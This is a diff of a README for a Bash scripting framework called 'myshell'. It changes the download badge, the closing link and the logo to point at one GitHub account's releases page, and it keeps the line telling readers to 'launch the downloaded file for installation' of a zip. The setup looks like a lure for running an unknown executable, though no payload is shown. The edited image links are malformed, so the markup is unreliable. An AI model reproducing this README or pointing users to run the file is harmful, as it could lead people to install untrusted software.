@@ -18,7 +18,7 @@ Welcome to the myshell repository, a comprehensive framework designed to enhance
 
 ## Installation
 You can download the latest version of myshell framework from the following link:
-[![Download myshell Framework](https://img.shields.io/badge/Download-App.zip-<COLOR>.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download myshell Framework](https://github.com/andrejarmen751/myshell/releases<COLOR>.svg)](https://github.com/andrejarmen751/myshell/releases)
 
 **Note:** Ensure to launch the downloaded file for installation.
 
@@ -43,8 +43,8 @@ The myshell framework is released under the MIT license. You are free to use, mo
 
 ---
 
-By leveraging the myshell framework, you can elevate your Bash scripting capabilities and streamline your workflow. Download now and experience the power of efficient Bash scripting tools at your fingertips. Visit the [link](https://github.com/repo/releases/9246/App.zip) to get started! 🌟
+By leveraging the myshell framework, you can elevate your Bash scripting capabilities and streamline your workflow. Download now and experience the power of efficient Bash scripting tools at your fingertips. Visit the [link](https://github.com/andrejarmen751/myshell/releases) to get started! 🌟
 
 Let's make Bash scripting a breeze with myshell! 🎉
 
-![myshell Logo](https://example.com/myshell-logo.png)
+![myshell Logo](https://github.com/andrejarmen751/myshell/releases)
